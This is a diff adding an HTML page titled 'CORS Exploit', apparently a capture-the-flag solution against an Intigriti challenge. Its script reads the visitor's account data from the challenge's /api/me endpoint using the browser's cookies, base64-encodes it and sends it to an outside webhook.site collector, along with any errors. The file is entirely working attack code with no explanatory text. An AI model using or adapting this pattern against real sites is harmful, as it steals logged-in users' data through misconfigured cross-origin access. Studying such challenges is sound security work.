@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Exploit</title>
+</head>
+<body>
+    <script>
+        const CHALLENGE_API = 'https://challenge-0126.intigriti.io/api/me';
+        const MY_WEBHOOK = 'https://webhook.site/720dc5e0-146a-476e-836f-84ea1bcd9dc1';
+
+        fetch(CHALLENGE_API, {
+            method: 'GET',
+            credentials: 'include' 
+        })
+        .then(response => response.json())
+        .then(data => {
+            fetch(MY_WEBHOOK + '?flag=' + btoa(JSON.stringify(data)));
+        })
+        .catch(err => {
+            fetch(MY_WEBHOOK + '?error=' + err);
+        });
+    </script>
+</body>
+</html>
